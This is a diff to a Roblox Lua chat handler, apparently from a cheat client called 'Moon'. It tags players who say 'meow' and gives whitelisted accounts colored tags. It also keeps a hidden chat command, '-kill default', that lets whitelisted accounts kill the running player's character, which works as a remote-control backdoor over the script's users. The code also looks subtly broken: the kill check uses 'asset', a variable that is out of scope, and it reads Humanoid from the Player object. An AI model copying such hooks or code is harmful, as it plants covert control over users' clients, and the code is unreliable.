@@ -19,34 +19,32 @@ game:GetService("Players").PlayerAdded:Connect(function(asset)
 end)
 
 game:GetService("TextChatService").OnIncomingMessage = function(msg)
-  if not msg or msg.TextSource then return end
+  if not msg or not msg.TextSource then return end
 
   local Player = game:GetService("Players"):GetPlayerByUserId(msg.TextSource.UserId)
   local Text = msg.Text
   local prefix = msg.PrefixText
   local props = Instance.new("TextChatMessageProperties")
 
-  if Text == "meow" then
-    if whitelistdata[tostring(Player.UserId)] then return end
-    if table.find(possible, Player) then return end
+  if Text:lower() == "meow" then
+    if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
     table.insert(possible, Player)
+    end
   end
 
   
   
-  if table.find(possible, Player) then
-    props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
-  end
+
 
   if whitelistdata[tostring(Player.UserId)] then
     props.PrefixText = "<font color='rgb(" .. whitelistdata[tostring(Player.UserId)].color[1] .. ", " .. whitelistdata[tostring(Player.UserId)].color[2] .. ", " .. whitelistdata[tostring(Player.UserId)].color[3] .. ")'>[" .. whitelistdata[tostring(Player.UserId)].tag .. "]</font> " .. prefix
+  elseif table.find(possible, Player) then
+    props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
   end
 
   if Player.UserId ~= game.Players.LocalPlayer.UserId then
-    if whitelistdata[tostring(asset.UserId)] then
-      if Text:lower():sub(1, 13) == "-kill default" then
+    if whitelistdata[tostring(asset.UserId)] and Text:lower() == "-kill default" then
         game.Players.LocalPlayer.Humanoid:ChangeState(15)
-      end
     end
   end
   return props
